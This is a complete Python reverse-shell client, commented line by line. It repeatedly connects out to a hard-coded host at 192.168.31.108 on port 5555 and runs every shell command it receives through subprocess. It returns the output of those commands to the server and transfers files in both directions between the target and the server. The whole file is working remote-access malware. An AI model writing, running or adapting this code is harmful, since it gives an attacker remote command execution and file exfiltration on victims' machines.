import socket  # Import socket module for network communication
import time  # Import time module for delays
import json  # Import json module to handle JSON data
import subprocess  # Import subprocess module to run shell commands
import os  # Import os module for operating system interactions

def reliable_send(data):
    """ Function to reliably send data over the network."""
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send JSON data

def reliable_recv():
    """ Function to reliably receive data over the network."""
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks
            return json.loads(data)  # Convert JSON data to Python object
        except ValueError:
            continue  # Continue receiving data if JSON is not complete

def connection():
    """ Function to repeatedly attempt to connect to the server."""
    while True:
        time.sleep(20)  # Wait for 20 seconds before retrying
        try:
            s.connect(('192.168.31.108', 5555))  # Try to connect to the server
            shell()  # Start shell interaction
            s.close()  # Close the socket after shell interaction
            break
        except:
            continue

def download_file(file_name):
    """ Function to download a file from the server."""
    f = open(file_name, 'wb')  # Open file in write-binary mode
    s.settimeout(1)  # Set timeout for the socket
    while True:
        try:
            chunk = s.recv(1024)  # Receive data in chunks
            if not chunk:
                break  # Exit the loop if no more data is received
            f.write(chunk)  # Write the received data to the file
        except socket.timeout:
            break 
    s.settimeout(None)  # Remove the timeout
    f.close()

def upload_file(file_name):
    """ Function to upload a file to the server."""
    f = open(file_name, 'rb')  # Open file in read-binary mode
    s.send(f.read())  # Read and send file data
    f.close()

def shell():
    """ Function to handle shell commands from the server."""
    while True:
        command = reliable_recv()  # Receive command from server
        if command == 'exit':
            break  # Exit the loop
        elif command[:3] == 'cd ':
            os.chdir(command[3:])  # Change directory on target
        elif command[:8] == 'download':
            upload_file(command[9:])  # Upload file to server
        elif command[:6] == 'upload':
            download_file(command[7:])  # Download file from server
        elif command == 'clear':
            pass  # Clear the terminal screen (no action needed)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()  # Execute command and read the output
            result = result.decode() 
            reliable_send(result)  # Send the output back to server

# Setup the client
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket using IPv4
connection()  # Start connection attempts
